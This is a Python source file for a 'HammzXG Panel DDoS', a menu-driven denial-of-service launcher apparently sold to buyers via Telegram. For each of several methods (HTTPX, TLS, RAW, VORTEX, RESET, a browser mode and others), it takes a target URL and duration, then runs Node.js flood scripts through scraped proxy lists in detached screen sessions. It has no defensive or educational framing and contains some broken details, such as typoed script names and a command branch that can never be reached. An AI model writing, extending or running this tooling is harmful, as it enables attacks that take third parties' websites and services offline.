import os
import sys
import getpass
import time

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
def logo():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO HammzXG PANEL DDOS | DEVELOPMENT BY t.me/HammzDev | MAIN MENU \x07")
	print("""Development By t.me/HammzDev | Ownered By t.me/HammzDev | TYPE [help]                    █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀

                    █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                    █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            HammzXG Panel DDoS | Development By t.me/HammzDev 
           ╚══╦══════════════════════════════════════════════╦══╝
              ╚══════════════════════════════════════════════╝
	""")

def menu():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO HammzXG PANEL DDOS | DEVELOPMENT BY t.me/HammzDev | HELP MENU \x07")
	print("""
                     █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                     █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            HammzXg Panel DDoS | Development By t.me/HammzDev
           ╚══╦══════════════════════════════════════════════╦══╝
              ╚══════════════════════════════════════════════╝
              

• PROXY | Premium proxies scraping | Tools
• METHODS | Available ddos methods | Menu
• HELP | This is display | Menu
• STOP | Stoped all attack in server | Tools
 ! If you want to use comments, use lowercase letters
""")

def ddos():
	clear()
	sys.stdout.write(f"\x1b]2; WELLCOME TO HammzXG PANEL DDOS | DEVELOPMENT BY t.me/HammzXG | LIST METHODS \x07")
	print("""Development By t.me/HammzDev | Ownered By t.me/HammzXG | USER: Buyer

                    █░░ █ █▀ █▀▀ █▀█ █░█ █ █▀▀ █▀▀
                    █▄▄ █ ▄█ ██▄ █▀▄ ▀▄▀ █ █▄▄ ██▄    
             ╚╦═════════════════════════════════════════════╦╝
           ╔══╩═════════════════════════════════════════════╩═══╗
            HammzXG Panel DDoS | Development By t.me/HammzXG 
           ╚══╦══════════════════════════════════════════════╦══╝
                     • HTTPX   • HTTPSV2   • VORTEX
                     • BROWSER • RESET     • TLS
                     • HTTPS   • RAW       • RPS
              ╚══════════════════════════════════════════════╝

""")


def main():
    logo()
    while(True):
        cnc = input("""Panel•DDoS[HammzXG]-> """)
        if cnc.lower() == "methodss":
            ddos()
        elif cnc.lower() in ["clear", "cls"]:
            main()
        elif cnc.lower() == "help":
            menu()
        elif cnc.lower() == "methods":
            ddos()
        elif cnc.lower() == "stop":
            os.system('pkill screen')
            print("Stops All Attacks")
        elif cnc.lower() == "setup":
            os.system("python3 installer.py")
            print("Done")
        elif cnc.lower() == "proxy":
            os.system(f'python3 scrape.py')

        elif "httpx" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
                os.system(f'screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: HTTPX
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: httpx <url> <time>')
                print('Example: httpx http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "strom" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node STROM {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: STROM
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: strom <url> <time>')
                print('Example: strom http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "browser" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
                os.system(f'screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
                os.system(f'screen -dm node HammzXG {host} {attack_time} 512 258 proxy.txt')
                os.system(f'node browser.js {host} 8 proxy.txt 64 {time} true --fin true --load true --headers true --blocked Indonesia --reconnect true --ipv6 true')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: BROWSER
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: browser <url> <time>')
                print('Example: browser http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')
                
        elif "https" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node HTPPSV2 GET {host} {attack_time} 8 8 proxy.txt')
                os.system(f'screen -dm node HTTPS POST {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: HTTPS
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: https <url> <time>')
                print('Example: https http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "httpsv2" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node HTPPSV2 POST {host} {attack_time} 8 8 proxy.txt --full')
                os.system(f'screen -dm node HTTPS GET {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: HTTPSV2
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: httpsv2 <url> <time>')
                print('Example: httpsv2 http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "reset" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node RESETV2 {host} {attack_time} 8 8 proxy.txt --full')
                os.system(f'screen -dm node RESET {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: RESET
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: reset <url> <time>')
                print('Example: reset http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "raw" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node RAW {host} {attack_time}')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: RAW
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: raw <url> <time>')
                print('Example: raw http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "vortex" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node VORTEX {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: VORTEX
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: VORTEX <url> <time>')
                print('Example: VORTEX http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif "tls" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node TLS {host} {attack_time} 8 8 proxy.txt')
                os.system(f'screen -dm node TLSV2 {host} {attack_time} 8 8 proxy.txt')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: tls
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
                os.system('pkill screen')
            except IndexError:
                print('Usage: tls <url> <time>')
                print('Example: tls http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')
                
        elif "rps" in cnc.lower():
            try:
                host = cnc.split()[1]
                attack_time = cnc.split()[2]
                os.system("clear")
                os.system(f'screen -dm node HTTPZ {host} {attack_time} 8 8 proxy.txt')
                os.system(f'screen -dm node HTTPX {host} {attack_time} 8 8 proxy.txt')
                os.system(f'screen -dm node HammzXG {host} {attack_time} 512 258 proxy.txt')
                os.system(f'screen -dm node RAW {host} {attack_time}')
                time.sleep(3)
                os.system('clear')
                os.system('screen -ls')
                time.sleep(3)
                os.system('clear')
                sys.stdout.write(f"\x1b]2; HammzXG PANEL DDOS BY t.me/HammzXG | Sent Attack\x07")
                sys.stdout.flush()
                print(f""" 
[System] Attack Information 
Target: {host}
Time: {attack_time}s
Method: RPS
Type [CLS] to clear the terminal""")
                time.sleep(int(attack_time))
            except IndexError:
                print('Usage: rps <url> <time>')
                print('Example: rps http://example.com 60')
            except ValueError:
                print('Time should be an integer. Attack Stop')

        elif cnc.lower() == "credit":
            print("""[System] | Welcome HammzXG Panel DDoS | Development By t.me/HammzXG | Ownered By t.me/HammzXG | Type [HELP]""")

        else:
            print(f"Command [{cnc}] Not Found. Type [HELP] to show commands.")

main()
